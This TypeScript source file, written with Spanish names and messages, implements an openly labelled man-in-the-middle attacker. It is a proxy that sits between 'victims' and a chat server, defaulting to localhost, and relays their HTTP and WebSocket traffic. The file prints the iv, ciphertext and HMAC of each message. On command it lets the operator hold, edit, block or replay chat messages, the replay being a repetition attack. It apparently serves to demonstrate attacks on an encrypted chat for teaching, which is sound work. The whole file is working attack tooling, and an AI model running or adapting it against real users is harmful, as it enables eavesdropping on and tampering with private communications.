import http from 'node:http';
import os from 'node:os';
import readline from 'node:readline';
import { WebSocketServer, WebSocket } from 'ws';

const puerto = Number(process.env.PUERTO || 4000);
const servidor = process.env.SERVIDOR || 'localhost:3000';
const hostServidor = servidor.split(':')[0];
const puertoServidor = Number(servidor.split(':')[1] || 3000);

type Victima = {
  nombre: string;
  navegador: WebSocket;
  servidor: WebSocket;
  enEspera: string[];
};

type Detenido = {
  victima: Victima;
  datos: any;
  haciaServidor: boolean;
};

type Guardado = {
  victima: Victima;
  texto: string;
  haciaServidor: boolean;
  numero: number;
  de: string;
};

let interceptar = false;
let contador = 0;
let detenidos: Detenido[] = [];
let revisando = false;
let ultimo: Guardado | null = null;
let yaPasaron = new Set<string>();

const consola = readline.createInterface({ input: process.stdin, output: process.stdout });

function hora(): string {
  return '[' + new Date().toTimeString().substring(0, 8) + ']';
}

function mostrar(texto: string) {
  console.log(texto);
}

function acortar(datos: any): string {
  let copia: any = {};
  for (let clave in datos) {
    let valor = datos[clave];
    if (typeof valor == 'string' && valor.length > 40) {
      valor = valor.substring(0, 32) + '...(' + valor.length + ' caracteres)';
    }
    copia[clave] = valor;
  }
  return JSON.stringify(copia);
}

function mandar(victima: Victima, texto: string, haciaServidor: boolean) {
  let socket = haciaServidor ? victima.servidor : victima.navegador;
  if (socket.readyState == WebSocket.OPEN) {
    socket.send(texto);
  } else if (socket.readyState == WebSocket.CONNECTING) {
    victima.enEspera.push(texto);
  }
}

function llego(victima: Victima, texto: string, haciaServidor: boolean) {
  let datos: any;
  try {
    datos = JSON.parse(texto);
  } catch (e) {
    mandar(victima, texto, haciaServidor);
    return;
  }

  if (haciaServidor && datos.usuario) {
    victima.nombre = datos.usuario;
  }
  if (!haciaServidor && datos.tipo == 'loginOk') {
    victima.nombre = datos.usuario;
  }

  if (datos.tipo != 'mensaje') {
    let camino = haciaServidor ? victima.nombre + ' -> servidor' : 'servidor -> ' + victima.nombre;
    mostrar(hora() + ' ' + camino + '  ' + acortar(datos));
    mandar(victima, texto, haciaServidor);
    return;
  }

  if (!haciaServidor && yaPasaron.has(datos.hmac)) {
    mostrar(hora() + ' servidor -> ' + victima.nombre + '  entrega el mensaje #' + datos.numero + ' de ' + datos.de);
    mandar(victima, texto, haciaServidor);
    return;
  }

  mostrar('');
  if (haciaServidor) {
    mostrar(hora() + ' ' + victima.nombre + ' -> ' + datos.para + '   MENSAJE #' + datos.numero);
  } else {
    mostrar(hora() + ' servidor -> ' + victima.nombre + '   MENSAJE #' + datos.numero + ' de ' + datos.de);
  }
  mostrar('           iv:      ' + datos.iv);
  mostrar('           cifrado: ' + datos.cifrado);
  mostrar('           hmac:    ' + datos.hmac);

  let detenido = { victima: victima, datos: datos, haciaServidor: haciaServidor };
  if (interceptar) {
    interceptar = false;
    detenidos.push(detenido);
    revisarDetenidos();
  } else {
    dejarPasar(detenido, false);
  }
}

function dejarPasar(detenido: Detenido, modificado: boolean) {
  let texto = JSON.stringify(detenido.datos);
  yaPasaron.add(detenido.datos.hmac);

  if (!modificado) {
    ultimo = {
      victima: detenido.victima,
      texto: texto,
      haciaServidor: detenido.haciaServidor,
      numero: detenido.datos.numero,
      de: detenido.haciaServidor ? detenido.victima.nombre : detenido.datos.de,
    };
  }

  mandar(detenido.victima, texto, detenido.haciaServidor);
}

function preguntar(texto: string, valorInicial = ''): Promise<string> {
  return new Promise((listo) => {
    consola.question(texto, listo);
    if (valorInicial) {
      consola.write(valorInicial);
    }
  });
}

async function revisarDetenidos() {
  if (revisando) {
    return;
  }
  revisando = true;
  while (detenidos.length > 0) {
    let detenido = detenidos.shift() as Detenido;
    await revisar(detenido);
    mostrar('>> Regreso a solo espiar, los mensajes vuelven a pasar normal. Escribe i para detener otro.');
    mostrar('');
  }
  revisando = false;
}

async function revisar(detenido: Detenido) {
  mostrar('  >> Mensaje #' + detenido.datos.numero + ' DETENIDO, no llega hasta que decidas');
  let opcion = (await preguntar('  [Enter] dejar pasar   [m] modificar   [b] bloquear: ')).trim().toLowerCase();

  if (opcion == 'b') {
    mostrar('  Mensaje bloqueado, nunca va a llegar.');
    return;
  }

  if (opcion == 'm') {
    let campos = ['cifrado', 'iv', 'numero', 'hmac'];
    let campo = '';
    while (!campos.includes(campo)) {
      campo = (await preguntar('  Que campo quieres cambiar? (cifrado, iv, numero, hmac): ')).trim().toLowerCase();
    }

    let nuevo = (await preguntar('  Editalo y presiona Enter: ', String(detenido.datos[campo]))).trim();
    detenido.datos[campo] = campo == 'numero' ? Number(nuevo) : nuevo;

    dejarPasar(detenido, true);
    mostrar('  Mensaje MODIFICADO y enviado.');
    return;
  }

  dejarPasar(detenido, false);
  mostrar('  Mensaje enviado sin cambios.');
}

function repetir() {
  if (!ultimo) {
    mostrar('Todavia no ha pasado ningun mensaje para repetir');
    return;
  }

  let socket = ultimo.haciaServidor ? ultimo.victima.servidor : ultimo.victima.navegador;
  if (socket.readyState != WebSocket.OPEN) {
    mostrar('No se puede repetir, ' + ultimo.victima.nombre + ' ya se desconecto');
    return;
  }

  mostrar('');
  mostrar(hora() + ' REPITIENDO el mensaje #' + ultimo.numero + ' de ' + ultimo.de + ' (ataque de repeticion)');
  mostrar('');
  socket.send(ultimo.texto);
}

const servidorHttp = http.createServer((peticion, respuesta) => {
  let reenvio = http.request(
    {
      host: hostServidor,
      port: puertoServidor,
      path: peticion.url,
      method: peticion.method,
      headers: peticion.headers,
    },
    (respuestaServidor) => {
      respuesta.writeHead(respuestaServidor.statusCode || 500, respuestaServidor.headers);
      respuestaServidor.pipe(respuesta);
    },
  );

  reenvio.on('error', () => {
    respuesta.writeHead(502, { 'Content-Type': 'text/plain; charset=utf-8' });
    respuesta.end('El atacante no pudo conectarse con el servidor del chat (' + servidor + '). Prendelo primero.');
  });

  peticion.pipe(reenvio);
});

const servidorWs = new WebSocketServer({ server: servidorHttp });

servidorWs.on('connection', (navegador, peticion) => {
  contador++;
  let victima: Victima = {
    nombre: 'victima' + contador,
    navegador: navegador,
    servidor: new WebSocket('ws://' + servidor),
    enEspera: [],
  };
  mostrar(hora() + ' Nueva victima conectada desde ' + peticion.socket.remoteAddress);

  victima.servidor.on('open', () => {
    for (let texto of victima.enEspera) {
      victima.servidor.send(texto);
    }
    victima.enEspera = [];
  });

  navegador.on('message', (datos) => llego(victima, datos.toString(), true));
  victima.servidor.on('message', (datos) => llego(victima, datos.toString(), false));

  navegador.on('close', () => victima.servidor.close());
  victima.servidor.on('close', () => navegador.close());

  navegador.on('error', () => {});
  victima.servidor.on('error', () => {
    mostrar('No me pude conectar con el servidor del chat (' + servidor + ')');
    navegador.close();
  });
});

consola.on('line', (linea) => {
  let comando = linea.trim().toLowerCase();

  if (comando == 'i') {
    interceptar = !interceptar;
    if (interceptar) {
      mostrar('>> El SIGUIENTE mensaje se va a detener para que decidas que hacer.');
    } else {
      mostrar('>> Cancelado. Solo estoy espiando.');
    }
  } else if (comando == 'r') {
    repetir();
  } else if (comando != '') {
    mostrar('Comandos: i = detener el siguiente mensaje, r = repetir el ultimo mensaje, Ctrl + C = salir');
  }
});

function direccionesDeRed(): string[] {
  let direcciones: string[] = [];
  let interfaces = os.networkInterfaces();
  for (let nombre in interfaces) {
    for (let datos of interfaces[nombre] || []) {
      if (datos.family == 'IPv4' && !datos.internal) {
        direcciones.push(datos.address);
      }
    }
  }
  return direcciones;
}

servidorHttp.listen(puerto, '0.0.0.0', () => {
  mostrar('==================================================');
  mostrar('  ATACANTE (hombre en medio)');
  mostrar('==================================================');
  mostrar('Las victimas entran por:');
  mostrar('  http://localhost:' + puerto);
  for (let ip of direccionesDeRed()) {
    mostrar('  http://' + ip + ':' + puerto);
  }
  mostrar('Todo lo que pase se reenvia al servidor real: ' + servidor);
  mostrar('');
  mostrar('Comandos:');
  mostrar('  i         detener el siguiente mensaje (para dejarlo pasar, modificarlo o bloquearlo)');
  mostrar('  r         repetir el ultimo mensaje (ataque de repeticion)');
  mostrar('  Ctrl + C  salir');
  mostrar('');
  mostrar('Solo estoy espiando...');
  mostrar('');
});
